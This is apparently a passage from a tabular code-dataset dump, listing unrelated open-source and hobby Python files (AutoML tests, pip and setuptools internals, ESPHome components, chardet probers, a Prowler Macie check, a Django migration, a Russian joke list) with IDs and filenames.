GCS_INPUT = ""gs://{}-automl-tables-test/bank-marketing.csv"".format(PROJECT)
GCS_OUTPUT = ""gs://{}-automl-tables-test/TABLE_TEST_OUTPUT/"".format(PROJECT)
BQ_INPUT = ""bq://{}.automl_test.bank_marketing"".format(PROJECT)
BQ_OUTPUT = ""bq://{}"".format(PROJECT)
PARAMS = {}


@pytest.mark.slow
def test_batch_predict(capsys):
    ensure_model_online()

    automl_tables_predict.batch_predict(
        PROJECT, REGION, STATIC_MODEL, GCS_INPUT, GCS_OUTPUT, PARAMS
    )
    out, _ = capsys.readouterr()
    assert ""Batch prediction complete"" in out


@pytest.mark.slow
def test_batch_predict_bq(capsys):
    ensure_model_online()
    automl_tables_predict.batch_predict_bq(
        PROJECT, REGION, STATIC_MODEL, BQ_INPUT, BQ_OUTPUT, PARAMS
    )
    out, _ = capsys.readouterr()
    assert ""Batch prediction complete"" in out


def ensure_model_online():
    model = model_test.ensure_model_ready()
    if model.deployment_state != Model.DeploymentState.DEPLOYED:
        automl_tables_model.deploy_model(PROJECT, REGION, model.display_name)

    return automl_tables_model.get_model(PROJECT, REGION, model.display_name)"
JY435	JY435-finder.py	"import gws
import gws.base.database
import gws.base.model
import gws.base.search
import gws.types as t

from . import provider

gws.ext.new.finder('postgres')


class Config(gws.base.search.finder.Config):
    """"""Database-based search""""""

    db: t.Optional[str]
    """"""database provider uid""""""
    tableName: str
    """"""sql table name""""""


class Object(gws.base.search.finder.Object):
    provider: provider.Object
    tableName: str

    def configure(self):
        self.tableName = self.var('tableName')
        self.configure_provider()
        self.configure_models()
        self.configure_templates()

        self.withKeyword = True
        self.withGeometry = True

        # if self.table.search_column:
        #     self.supportsKeyword = True
        # if self.table.geometry_column:
        #     self.supportsGeometry = True
        #
        # self.withKeyword = self.supportsKeyword and self.var('withKeyword', default=True)
        # self.withGeometry = self.supportsGeometry and self.var('withGeometry', default=True)

    def configure_provider(self):
        self.provider = gws.base.database.provider.get_for(self, ext_type='postgres')
        return True

    # def _filter_to_sql(self, f: gws.SearchFilter):
    #     if not f:
    #         return
    #
    #     if f.operator in ('and', 'or'):
    #         w = []
    #         p = []
    #         for sub in f.sub:
    #             where = self._filter_to_sql(sub)
    #             w.append(where[0])
    #             p.extend(where[1:])
    #         wstr = '(' + f' {f.operator} '.join(w) + ')'
    #         return [wstr, *p]
    #
    #     if f.operator == 'bbox':
    #         return [
    #             f'ST_Intersects(%s::geometry, ""{self.table.geometry_column}"")',
    #             f.shape.ewkb_hex
    #         ]
    #
    #     # @TODO must take editDataModel into account
    #
    #     return [f'{f.name} {f.operator} %s', f.value]"
JY61	JY61-xmlrpc.py	"""""""xmlrpclib.Transport implementation
""""""

import logging
import urllib.parse
import xmlrpc.client
from typing import TYPE_CHECKING, Tuple

from pip._internal.exceptions import NetworkConnectionError
from pip._internal.network.session import PipSession
from pip._internal.network.utils import raise_for_status

if TYPE_CHECKING:
    from xmlrpc.client import _HostType, _Marshallable

logger = logging.getLogger(__name__)


class PipXmlrpcTransport(xmlrpc.client.Transport):
    """"""Provide a `xmlrpclib.Transport` implementation via a `PipSession`
    object.
    """"""

    def __init__(
        self, index_url: str, session: PipSession, use_datetime: bool = False
    ) -> None:
        super().__init__(use_datetime)
        index_parts = urllib.parse.urlparse(index_url)
        self._scheme = index_parts.scheme
        self._session = session

    def request(
        self,
        host: ""_HostType"",
        handler: str,
        request_body: bytes,
        verbose: bool = False,
    ) -> Tuple[""_Marshallable"", ...]:
        assert isinstance(host, str)
        parts = (self._scheme, host, handler, None, None, None)
        url = urllib.parse.urlunparse(parts)
        try:
            headers = {""Content-Type"": ""text/xml""}
            response = self._session.post(
                url,
                data=request_body,
                headers=headers,
                stream=True,
            )
            raise_for_status(response)
            self.verbose = verbose
            return self.parse_response(response.raw)
        except NetworkConnectionError as exc:
            assert exc.response
            logger.critical(
                ""HTTP error %s while getting %s"",
                exc.response.status_code,
                url,
            )
            raise"
JY509	JY509-light.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import light, output
from esphome.const import (
    CONF_CONSTANT_BRIGHTNESS,
    CONF_OUTPUT_ID,
    CONF_COLD_WHITE,
    CONF_WARM_WHITE,
    CONF_COLD_WHITE_COLOR_TEMPERATURE,
    CONF_WARM_WHITE_COLOR_TEMPERATURE,
)

cwww_ns = cg.esphome_ns.namespace(""cwww"")
CWWWLightOutput = cwww_ns.class_(""CWWWLightOutput"", light.LightOutput)

CONFIG_SCHEMA = cv.All(
    light.RGB_LIGHT_SCHEMA.extend(
        {
            cv.GenerateID(CONF_OUTPUT_ID): cv.declare_id(CWWWLightOutput),
            cv.Required(CONF_COLD_WHITE): cv.use_id(output.FloatOutput),
            cv.Required(CONF_WARM_WHITE): cv.use_id(output.FloatOutput),
            cv.Optional(CONF_COLD_WHITE_COLOR_TEMPERATURE): cv.color_temperature,
            cv.Optional(CONF_WARM_WHITE_COLOR_TEMPERATURE): cv.color_temperature,
            cv.Optional(CONF_CONSTANT_BRIGHTNESS, default=False): cv.boolean,
        }
    ),
    cv.has_none_or_all_keys(
        [CONF_COLD_WHITE_COLOR_TEMPERATURE, CONF_WARM_WHITE_COLOR_TEMPERATURE]
    ),
    light.validate_color_temperature_channels,
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_OUTPUT_ID])
    await light.register_light(var, config)

    cwhite = await cg.get_variable(config[CONF_COLD_WHITE])
    cg.add(var.set_cold_white(cwhite))
    if CONF_COLD_WHITE_COLOR_TEMPERATURE in config:
        cg.add(
            var.set_cold_white_temperature(config[CONF_COLD_WHITE_COLOR_TEMPERATURE])
        )

    wwhite = await cg.get_variable(config[CONF_WARM_WHITE])
    cg.add(var.set_warm_white(wwhite))
    if CONF_WARM_WHITE_COLOR_TEMPERATURE in config:
        cg.add(
            var.set_warm_white_temperature(config[CONF_WARM_WHITE_COLOR_TEMPERATURE])
        )

    cg.add(var.set_constant_brightness(config[CONF_CONSTANT_BRIGHTNESS]))"
JD488	JD488-__init__.py	"import sys


class VendorImporter:
    """"""
    A PEP 302 meta path importer for finding optionally-vendored
    or otherwise naturally-installed packages from root_name.
    """"""

    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):
        self.root_name = root_name
        self.vendored_names = set(vendored_names)
        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')

    @property
    def search_path(self):
        """"""
        Search first the vendor package then as a natural package.
        """"""
        yield self.vendor_pkg + '.'
        yield ''

    def find_module(self, fullname, path=None):
        """"""
        Return self when fullname starts with root_name and the
        target module is one vendored through this importer.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        if root:
            return
        if not any(map(target.startswith, self.vendored_names)):
            return
        return self

    def load_module(self, fullname):
        """"""
        Iterate over the search path to locate and load fullname.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        for prefix in self.search_path:
            try:
                extant = prefix + target
                __import__(extant)
                mod = sys.modules[extant]
                sys.modules[fullname] = mod
                return mod
            except ImportError:
                pass
        else:
            raise ImportError(
                ""The '{target}' package is required; ""
                ""normally this is bundled with this package so if you get ""
                ""this warning, consult the packager of your ""
                ""distribution."".format(**locals())
            )

    def install(self):
        """"""
        Install this importer into sys.meta_path if not already present.
        """"""
        if self not in sys.meta_path:
            sys.meta_path.append(self)


names = 'six', 'packaging', 'pyparsing', 'ordered_set',
VendorImporter(__name__, names, 'setuptools._vendor').install()"
JY397	JY397-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""funnelarea.title"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY73	JY73-videoSplit.py	"import numpy as np
import cv2

import base64

def video_split(contents):
    url = '../data/data.mp4'
    content_type, content_string = contents.split(',')

    decoded = base64.b64decode(content_string)

    fh = open(url, ""wb"")
    fh.write(decoded)
    fh.close()
    print(""Data upload"")

    print(""Start process video"")

    # Cargamos video
    video = cv2.VideoCapture(url)

    # Meta datos del video
    n_frame = int(video.get(cv2.CAP_PROP_FRAME_COUNT))
    fs_actual = int(video.get(cv2.CAP_PROP_FPS))

    # Tamaño de paso de la ventana para remuestreo 
    muestra = int(n_frame/37)

    # crear el objeto video
    #fourcc = cv2.VideoWriter_fourcc(*""mp4v"")
    #out = cv2.VideoWriter(""./datos/1_nuevo_37fps.mp4"", fourcc, 10, (192,192))

    # Nuevas dimenciones del video 
    nuevo_ancho = 192
    nuevo_alto = 192

    # Variables para la extracion de muestras
    contador = 0
    contador_muestras = 0
    i = int(np.random.randint(low=0, high=muestra))

    # Bucle principal
    images = []
    while True:
        ret, frame = video.read()
        if not ret:
            break

        if contador_muestras == 37:
            break
        else:
            ventana_muestra = (contador_muestras*muestra) + i
            if contador == ventana_muestra:
                # Nuevo frame seleccionado
                nuevo_cuadro = cv2.resize(frame, (nuevo_ancho, nuevo_alto))
                images.append(nuevo_cuadro)

                # Restablecemos los valores para una nueva muestra 
                i = int(np.random.randint(low=0, high=muestra))
                contador_muestras = contador_muestras+1
        
        contador = contador+1

    # liberamos recursos
    video.release()

    images = np.array(images)
    np.save(""../data\data_array"", images)
    print(""end process video"")"
JY504	JY504-sensor.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import i2c, sensor
from esphome.const import (
    CONF_ID,
    CONF_PRESSURE,
    CONF_TEMPERATURE,
    DEVICE_CLASS_PRESSURE,
    DEVICE_CLASS_TEMPERATURE,
    STATE_CLASS_MEASUREMENT,
    UNIT_CELSIUS,
    ICON_GAUGE,
    UNIT_HECTOPASCAL,
)

DEPENDENCIES = [""i2c""]

ms5611_ns = cg.esphome_ns.namespace(""ms5611"")
MS5611Component = ms5611_ns.class_(
    ""MS5611Component"", cg.PollingComponent, i2c.I2CDevice
)

CONFIG_SCHEMA = (
    cv.Schema(
        {
            cv.GenerateID(): cv.declare_id(MS5611Component),
            cv.Required(CONF_TEMPERATURE): sensor.sensor_schema(
                unit_of_measurement=UNIT_CELSIUS,
                accuracy_decimals=1,
                device_class=DEVICE_CLASS_TEMPERATURE,
                state_class=STATE_CLASS_MEASUREMENT,
            ),
            cv.Required(CONF_PRESSURE): sensor.sensor_schema(
                unit_of_measurement=UNIT_HECTOPASCAL,
                icon=ICON_GAUGE,
                accuracy_decimals=1,
                device_class=DEVICE_CLASS_PRESSURE,
                state_class=STATE_CLASS_MEASUREMENT,
            ),
        }
    )
    .extend(cv.polling_component_schema(""60s""))
    .extend(i2c.i2c_device_schema(0x77))
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    await i2c.register_i2c_device(var, config)

    if CONF_TEMPERATURE in config:
        sens = await sensor.new_sensor(config[CONF_TEMPERATURE])
        cg.add(var.set_temperature_sensor(sens))

    if CONF_PRESSURE in config:
        sens = await sensor.new_sensor(config[CONF_PRESSURE])
        cg.add(var.set_pressure_sensor(sens))"
JD430	JD430-retries.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from datetime import datetime, timedelta
from random import random

from airflow.models import DAG
from airflow.operators.python import PythonOperator


FAILURE_PROBABILITY = 0.5
RETRIES = 1
# Increase the number of retries to make the DAG finish successfully.
# RETRIES = 3

default_args = {
    'start_date': datetime(2022, 4, 1),
    'retries': RETRIES,
    'retry_delay': timedelta(seconds=1)
}

with DAG('retries',
         default_args=default_args,
         schedule_interval=None) as dag:

    def api_call(parameter: int) -> None:
        import logging
        if random() < FAILURE_PROBABILITY:
            logging.error('Error: Simulating API flakiness')
            raise RuntimeError('Error: Simulating API flakiness')
        logging.info(f'Calling API with parameter {parameter}')

    task1 = PythonOperator(
        task_id='task1',
        python_callable=api_call,
        op_kwargs={'parameter': 1}
    )
    task2 = PythonOperator(
        task_id='task2',
        python_callable=api_call,
        op_kwargs={'parameter': 2}
    )
    task3 = PythonOperator(
        task_id='task3',
        python_callable=api_call,
        op_kwargs={'parameter': 3}
    )
    task4 = PythonOperator(
        task_id='task4',
        python_callable=api_call,
        op_kwargs={'parameter': 4}
    )

    # task2 and task3 run in parallel right after task1.
    task1 >> [task2, task3] >> task4"
JD37	JD37-before_sleep.py	"# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import typing

from pip._vendor.tenacity import _utils

if typing.TYPE_CHECKING:
    import logging

    from pip._vendor.tenacity import RetryCallState


def before_sleep_nothing(retry_state: ""RetryCallState"") -> None:
    """"""Before call strategy that does nothing.""""""


def before_sleep_log(
    logger: ""logging.Logger"",
    log_level: int,
    exc_info: bool = False,
) -> typing.Callable[[""RetryCallState""], None]:
    """"""Before call strategy that logs to some logger the attempt.""""""

    def log_it(retry_state: ""RetryCallState"") -> None:
        if retry_state.outcome.failed:
            ex = retry_state.outcome.exception()
            verb, value = ""raised"", f""{ex.__class__.__name__}: {ex}""

            if exc_info:
                local_exc_info = retry_state.outcome.exception()
            else:
                local_exc_info = False
        else:
            verb, value = ""returned"", retry_state.outcome.result()
            local_exc_info = False  # exc_info does not apply when no exception

        logger.log(
            log_level,
            f""Retrying {_utils.get_callback_name(retry_state.fn)} ""
            f""in {retry_state.next_action.sleep} seconds as it {verb} {value}."",
            exc_info=local_exc_info,
        )

    return log_it"
JD127	JD127-poly1305.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import typing

from cryptography import utils
from cryptography.exceptions import (
    AlreadyFinalized,
    UnsupportedAlgorithm,
    _Reasons,
)
from cryptography.hazmat.backends.openssl.poly1305 import _Poly1305Context


class Poly1305:
    _ctx: typing.Optional[_Poly1305Context]

    def __init__(self, key: bytes):
        from cryptography.hazmat.backends.openssl.backend import backend

        if not backend.poly1305_supported():
            raise UnsupportedAlgorithm(
                ""poly1305 is not supported by this version of OpenSSL."",
                _Reasons.UNSUPPORTED_MAC,
            )
        self._ctx = backend.create_poly1305_ctx(key)

    def update(self, data: bytes) -> None:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        utils._check_byteslike(""data"", data)
        self._ctx.update(data)

    def finalize(self) -> bytes:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        mac = self._ctx.finalize()
        self._ctx = None
        return mac

    def verify(self, tag: bytes) -> None:
        utils._check_bytes(""tag"", tag)
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")

        ctx, self._ctx = self._ctx, None
        ctx.verify(tag)

    @classmethod
    def generate_tag(cls, key: bytes, data: bytes) -> bytes:
        p = Poly1305(key)
        p.update(data)
        return p.finalize()

    @classmethod
    def verify_tag(cls, key: bytes, data: bytes, tag: bytes) -> None:
        p = Poly1305(key)
        p.update(data)
        p.verify(tag)"
JY143	JY143-_entry_points.py	"import functools
import operator
import itertools

from .extern.jaraco.text import yield_lines
from .extern.jaraco.functools import pass_none
from ._importlib import metadata
from ._itertools import ensure_unique
from .extern.more_itertools import consume


def ensure_valid(ep):
    """"""
    Exercise one of the dynamic properties to trigger
    the pattern match.
    """"""
    ep.extras


def load_group(value, group):
    """"""
    Given a value of an entry point or series of entry points,
    return each as an EntryPoint.
    """"""
    # normalize to a single sequence of lines
    lines = yield_lines(value)
    text = f'[{group}]\n' + '\n'.join(lines)
    return metadata.EntryPoints._from_text(text)


def by_group_and_name(ep):
    return ep.group, ep.name


def validate(eps: metadata.EntryPoints):
    """"""
    Ensure entry points are unique by group and name and validate each.
    """"""
    consume(map(ensure_valid, ensure_unique(eps, key=by_group_and_name)))
    return eps


@functools.singledispatch
def load(eps):
    """"""
    Given a Distribution.entry_points, produce EntryPoints.
    """"""
    groups = itertools.chain.from_iterable(
        load_group(value, group)
        for group, value in eps.items())
    return validate(metadata.EntryPoints(groups))


@load.register(str)
def _(eps):
    r""""""
    >>> ep, = load('[console_scripts]\nfoo=bar')
    >>> ep.group
    'console_scripts'
    >>> ep.name
    'foo'
    >>> ep.value
    'bar'
    """"""
    return validate(metadata.EntryPoints(metadata.EntryPoints._from_text(eps)))


load.register(type(None), lambda x: x)


@pass_none
def render(eps: metadata.EntryPoints):
    by_group = operator.attrgetter('group')
    groups = itertools.groupby(sorted(eps, key=by_group), by_group)

    return '\n'.join(
        f'[{group}]\n{render_items(items)}\n'
        for group, items in groups
    )


def render_items(eps):
    return '\n'.join(
        f'{ep.name} = {ep.value}'
        for ep in sorted(eps)
    )"
JY62	JY62-euckrprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import EUCKR_SM_MODEL


class EUCKRProber(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""EUC-KR""

    @property
    def language(self) -> str:
        return ""Korean"""
JD498	JD498-0002_rules_vehicle.py	"# Generated by Django 4.1.5 on 2023-03-07 04:49

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ('rto', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Rules',
            fields=[
                ('rule_id', models.AutoField(primary_key=True, serialize=False)),
                ('rule_code', models.CharField(max_length=50)),
                ('rule_desc', models.CharField(blank=True, max_length=100)),
                ('rule_sect', models.CharField(max_length=50, null=True)),
                ('rule_pen', models.CharField(max_length=100, null=True)),
            ],
        ),
        migrations.CreateModel(
            name='Vehicle',
            fields=[
                ('vehicle_id', models.AutoField(primary_key=True, serialize=False)),
                ('vehicle_no', models.CharField(default=None, max_length=50)),
                ('vehicle_own_name', models.CharField(default=None, max_length=50)),
                ('vehicle_own_contact', models.IntegerField(default=None)),
                ('vehicle_own_add', models.CharField(default=None, max_length=100)),
                ('vehicle_own_email', models.CharField(default=None, max_length=50)),
                ('vehicle_company_name', models.CharField(default=None, max_length=50)),
                ('vehicle_date_reg', models.DateField(default=None)),
                ('vehicle_chassics_no', models.CharField(default=None, max_length=30)),
                ('vehicle_eng_no', models.CharField(default=None, max_length=30)),
                ('vehicle_own_srno', models.IntegerField(default=None)),
                ('vehicle_fuel_use', models.CharField(default=None, max_length=30)),
                ('vehicle_Seat_cap', models.IntegerField(default=None)),
                ('vehicle_model_name', models.CharField(default=None, max_length=50)),
                ('vehicle_created_date', models.DateField(auto_now_add=True)),
                ('vehicle_last_login', models.CharField(default=None, max_length=30)),
            ],
        ),
    ]"
JD57	JD57-signals.py	"import typing as t

try:
    from blinker import Namespace

    signals_available = True
except ImportError:
    signals_available = False

    class Namespace:  # type: ignore
        def signal(self, name: str, doc: t.Optional[str] = None) -> ""_FakeSignal"":
            return _FakeSignal(name, doc)

    class _FakeSignal:
        """"""If blinker is unavailable, create a fake class with the same
        interface that allows sending of signals but will fail with an
        error on anything else.  Instead of doing anything on send, it
        will just ignore the arguments and do nothing instead.
        """"""

        def __init__(self, name: str, doc: t.Optional[str] = None) -> None:
            self.name = name
            self.__doc__ = doc

        def send(self, *args: t.Any, **kwargs: t.Any) -> t.Any:
            pass

        def _fail(self, *args: t.Any, **kwargs: t.Any) -> t.Any:
            raise RuntimeError(
                ""Signalling support is unavailable because the blinker""
                "" library is not installed.""
            ) from None

        connect = connect_via = connected_to = temporarily_connected_to = _fail
        disconnect = _fail
        has_receivers_for = receivers_for = _fail
        del _fail


# The namespace for code signals.  If you are not Flask code, do
# not put signals in here.  Create your own namespace instead.
_signals = Namespace()


# Core signals.  For usage examples grep the source code or consult
# the API documentation in docs/api.rst as well as docs/signals.rst
template_rendered = _signals.signal(""template-rendered"")
before_render_template = _signals.signal(""before-render-template"")
request_started = _signals.signal(""request-started"")
request_finished = _signals.signal(""request-finished"")
request_tearing_down = _signals.signal(""request-tearing-down"")
got_request_exception = _signals.signal(""got-request-exception"")
appcontext_tearing_down = _signals.signal(""appcontext-tearing-down"")
appcontext_pushed = _signals.signal(""appcontext-pushed"")
appcontext_popped = _signals.signal(""appcontext-popped"")
message_flashed = _signals.signal(""message-flashed"")"
JD78	JD78-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber()
        ]
        self.reset()"
JD135	JD135-exceptions.py	"# SPDX-License-Identifier: MIT


class FrozenError(AttributeError):
    """"""
    A frozen/immutable instance or attribute have been attempted to be
    modified.

    It mirrors the behavior of ``namedtuples`` by using the same error message
    and subclassing `AttributeError`.

    .. versionadded:: 20.1.0
    """"""

    msg = ""can't set attribute""
    args = [msg]


class FrozenInstanceError(FrozenError):
    """"""
    A frozen instance has been attempted to be modified.

    .. versionadded:: 16.1.0
    """"""


class FrozenAttributeError(FrozenError):
    """"""
    A frozen attribute has been attempted to be modified.

    .. versionadded:: 20.1.0
    """"""


class AttrsAttributeNotFoundError(ValueError):
    """"""
    An ``attrs`` function couldn't find an attribute that the user asked for.

    .. versionadded:: 16.2.0
    """"""


class NotAnAttrsClassError(ValueError):
    """"""
    A non-``attrs`` class has been passed into an ``attrs`` function.

    .. versionadded:: 16.2.0
    """"""


class DefaultAlreadySetError(RuntimeError):
    """"""
    A default has been set using ``attr.ib()`` and is attempted to be reset
    using the decorator.

    .. versionadded:: 17.1.0
    """"""


class UnannotatedAttributeError(RuntimeError):
    """"""
    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type
    annotation.

    .. versionadded:: 17.3.0
    """"""


class PythonTooOldError(RuntimeError):
    """"""
    It was attempted to use an ``attrs`` feature that requires a newer Python
    version.

    .. versionadded:: 18.2.0
    """"""


class NotCallableError(TypeError):
    """"""
    A ``attr.ib()`` requiring a callable has been set with a value
    that is not callable.

    .. versionadded:: 19.2.0
    """"""

    def __init__(self, msg, value):
        super(TypeError, self).__init__(msg, value)
        self.msg = msg
        self.value = value

    def __str__(self):
        return str(self.msg)"
JD353	JD353-macie_service.py	"import threading
from dataclasses import dataclass

from prowler.lib.logger import logger
from prowler.providers.aws.aws_provider import generate_regional_clients


################## Macie
class Macie:
    def __init__(self, audit_info):
        self.service = ""macie2""
        self.session = audit_info.audit_session
        self.audited_account = audit_info.audited_account
        self.regional_clients = generate_regional_clients(self.service, audit_info)
        self.sessions = []
        self.__threading_call__(self.__get_macie_session__)

    def __get_session__(self):
        return self.session

    def __threading_call__(self, call):
        threads = []
        for regional_client in self.regional_clients.values():
            threads.append(threading.Thread(target=call, args=(regional_client,)))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def __get_macie_session__(self, regional_client):
        logger.info(""Macie - Get Macie Session..."")
        try:
            self.sessions.append(
                Session(
                    regional_client.get_macie_session()[""status""],
                    regional_client.region,
                )
            )

        except Exception as error:
            if ""Macie is not enabled"" in str(error):
                self.sessions.append(
                    Session(
                        ""DISABLED"",
                        regional_client.region,
                    )
                )
            else:
                logger.error(
                    f""{regional_client.region} -- {error.__class__.__name__}[{error.__traceback__.tb_lineno}]: {error}""
                )


@dataclass
class Session:
    status: str
    region: str

    def __init__(
        self,
        status,
        region,
    ):
        self.status = status
        self.region = region"
JY189	JY189-jokes.py	"import random

jokes = ['''
Заходят два дракона в бар. Один говорит другому:
— Что-то здесь жарковато.
А тот отвечает:
— А ты рот свой закрой.
''', '''
Купил мужчина шляпу, а она ему как раз.
''', '''
— Скажите, а это ваш ""Ягуар"" стоит около выхода?
— Да.
— Я допью?
''', '''
Заходит как-то давление в один бар в один бар.
''', '''
Библиотекарша чихнула, и её сопля попала в книгу рекордов Гиннеса
''', '''
Заходит чукча в магазин телевизоров и говорит:
- У вас естя цветные телевизоры?
Продавец ему отвечает:
- Есть.
- Дайте мене тогда зеленый
''', '''
На распродаже человеческих органов нaчалась давка и я еле успел унести нoги.
''', '''
Научил попугая говорить ""Спасибо"". Он был благодарен.
''', '''
Пришёл мужик в магазин:
— Нарежьте мне колбасы 100г, только 50 справа налево, а 50 слева направо.
— Хорошо, а вы что полицейский?
— Да, а как вы догадались?
— Вы в форме.
''', '''
Молвил богатырь: — Выходи, чудище поганое! И ответило чудище поганое: — Извините, но мне только через две остановки выходить.
''', '''
— Василий Иванович, белые идут!
— А как же красные?
— А красные вас полнят.
''', '''
Первый человек, гуляя по райскому саду, обратился к Богу:
— Боже, а дашь мне имя?
— А дам.
''']

def getRandomJoke(jokes):
    return (random.choice(jokes))"
JY164	JY164-base.py	"import unittest

from nbformat import v4 as nbformat


class NBClientTestsBase(unittest.TestCase):
    def build_notebook(self, with_json_outputs=False):
        """"""Build a notebook in memory for use with NotebookClient tests""""""

        outputs = [
            nbformat.new_output(""stream"", name=""stdout"", text=""a""),
            nbformat.new_output(""display_data"", data={'text/plain': 'b'}),
            nbformat.new_output(""stream"", name=""stdout"", text=""c""),
            nbformat.new_output(""stream"", name=""stdout"", text=""d""),
            nbformat.new_output(""stream"", name=""stderr"", text=""e""),
            nbformat.new_output(""stream"", name=""stderr"", text=""f""),
            nbformat.new_output(""display_data"", data={'image/png': 'Zw=='}),  # g
            nbformat.new_output(""display_data"", data={'application/pdf': 'aA=='}),  # h
        ]
        if with_json_outputs:
            outputs.extend(
                [
                    nbformat.new_output(""display_data"", data={'application/json': [1, 2, 3]}),  # j
                    nbformat.new_output(
                        ""display_data"", data={'application/json': {'a': 1, 'c': {'b': 2}}}
                    ),  # k
                    nbformat.new_output(""display_data"", data={'application/json': 'abc'}),  # l
                    nbformat.new_output(""display_data"", data={'application/json': 15.03}),  # m
                ]
            )

        cells = [
            nbformat.new_code_cell(source=""$ e $"", execution_count=1, outputs=outputs),
            nbformat.new_markdown_cell(source=""$ e $""),
        ]

        return nbformat.new_notebook(cells=cells)

    def build_resources(self):
        """"""Build an empty resources dictionary.""""""
